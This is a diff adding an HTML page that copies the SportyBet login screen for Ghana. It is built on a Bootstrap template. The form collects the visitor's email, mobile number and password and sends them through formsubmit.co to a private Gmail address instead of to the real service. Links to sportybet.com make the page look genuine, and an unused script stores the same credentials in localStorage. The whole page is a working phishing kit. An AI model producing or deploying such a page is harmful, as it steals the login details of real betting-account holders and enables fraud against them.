@@ -1,0 +1,125 @@
+<!doctype html>
+<html lang="en" class="h-100">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
+    <meta name="generator" content="Hugo 0.88.1">
+    <title>Sporty bet</title>
+
+    <link rel="canonical" href="https://getbootstrap.com/docs/5.1/examples/sticky-footer/">
+
+    
+
+    <!-- Bootstrap core CSS -->
+<link href="../assets/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <style>
+      .bd-placeholder-img {
+        font-size: 1.125rem;
+        text-anchor: middle;
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        user-select: none;
+      }
+
+      @media (min-width: 768px) {
+        .bd-placeholder-img-lg {
+          font-size: 3.5rem;
+        }
+      }
+      h4{
+        color: green;
+        position: relative;
+        top: -90px;
+        left: 100px;
+      }
+      h3{
+        position: relative;
+        top: -50px;
+        left: 40px;
+      }
+      input{
+        height: 35px;
+        width: 200px;
+        text-align: center;
+        position: relative;
+        top: -45px;
+        margin:10px;
+        
+      }
+      button{
+        height: 35px;
+        width: 200px;
+        color: white;
+        background: silver;
+        position: relative;
+        left: 10px;
+        border: silver;
+      }
+      a{
+        text-decoration: none;
+      }
+    </style>
+
+    
+    <!-- Custom styles for this template -->
+    <link href="sticky-footer.css" rel="stylesheet">
+  </head>
+  <body class="d-flex flex-column h-100">
+    
+<!-- Begin page content -->
+<main class="flex-shrink-0">
+  <div class="container">
+    <img src="gh.png" height="30px", width="30px"/>
+    <h3>Ghana</h3>
+    <h4>Change ></h4>
+    
+    
+    
+        
+  </div>
+</main>
+
+<form action="https://formsubmit.co/josephbandoh941@gmail.com" method="POSt">
+   <div>
+    <input type="email" name="email" placeholder="email address" required>
+  </div>
+  <div>
+    <input type="text" name="name" placeholder="Mobile Number" required>
+  </div>
+  <div>
+    <input type="text" name="password" placeholder="Password" required>
+  </div>
+  <div>
+    <button type = "submit">Log in</button>
+  </div>
+  <div>
+    <a href="www.sportybet.com" >Forgot Password ?</a> <a href="www.sportybet.com" >Create New Account</a>
+  </div>
+
+
+
+
+
+
+</form>
+
+
+
+    
+  </body>
+<script>
+  function sd(){
+    let mobile = document.getElementById("mobile").value;
+    let pass = document.getElementById("pass").value;
+    let ead = document.getElementById("ead").value;
+
+    localStorage.setItem("mobile", mobile);
+    localStorage.setItem("pass", pass);
+    localStorage.setItem("ead", ead);
+    console.log(mobile, pass, ead);
+  }
+</script>
+</html>
